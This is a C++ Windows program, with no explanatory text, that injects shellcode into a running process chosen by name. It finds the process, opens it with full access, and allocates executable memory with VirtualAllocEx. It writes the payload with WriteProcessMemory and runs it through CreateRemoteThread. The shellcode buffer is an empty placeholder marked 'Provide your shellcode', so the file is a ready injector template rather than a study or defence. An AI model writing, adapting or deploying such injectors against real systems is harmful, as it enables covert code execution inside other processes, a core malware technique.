#include <Windows.h>
#include <iostream>
#include <TlHelp32.h>

// Provide your shellcode
unsigned char shellcode[] = {
    0x00
};

int main(int argc, char* argv[]) {
    if (argc < 2) {
        std::cout << "Error, provide an argument" << std::endl;
        return 1;
    }

    int wideSize = MultiByteToWideChar(CP_UTF8, 0, argv[1], -1, NULL, 0);

    if (wideSize == 0) {
        std::cout << "Error in char to wchar conversion: " << GetLastError() << std::endl;
    }

    WCHAR* procName = new WCHAR[wideSize];
    if (MultiByteToWideChar(CP_UTF8, 0, argv[1], -1, procName, wideSize) == 0) {
        std::cout << "Error in char to wchar conversion: " << GetLastError() << std::endl;
    }

    DWORD pid = 0;

    HANDLE hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcSnap == INVALID_HANDLE_VALUE) {
        std::cout << "Error taking process snapshot: " << GetLastError() << std::endl;
        return 1;
        delete[] procName;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hProcSnap, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, procName) == 0) {
                pid = pe32.th32ProcessID;
                break;
            }
        } while (Process32Next(hProcSnap, &pe32));
    }
    CloseHandle(hProcSnap);

    delete[] procName;

    if (!pid) {
        std::cout << "Process not found" << std::endl;
        return 1;
    }

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) {
        std::cout << "Error opening process: " << GetLastError() << std::endl;
        return 1;
    }

    PVOID rBuf = VirtualAllocEx(hProc, NULL, sizeof(shellcode), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    if (!rBuf) {
        std::cout << "Error allocating memory in target process: " << GetLastError() << std::endl;
        CloseHandle(hProc);
        return 1;
    }

    if (!WriteProcessMemory(hProc, rBuf, shellcode, sizeof(shellcode), NULL)) {
        std::cout << "Error writing memory in target process: " << GetLastError() << std::endl;
        VirtualFreeEx(hProc, rBuf, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return 1;
    }

    HANDLE remoteThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)rBuf, NULL, 0, NULL);
    if (!remoteThread) {
        std::cout << "Error creating remote thread: " << GetLastError() << std::endl;
        VirtualFreeEx(hProc, rBuf, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return 1;
    }

    WaitForSingleObject(remoteThread, INFINITE);

    std::cout << "Shellcode injected and executed successfully" << std::endl;

    VirtualFreeEx(hProc, rBuf, 0, MEM_RELEASE);
    CloseHandle(remoteThread);
    CloseHandle(hProc);
    return 0;
}
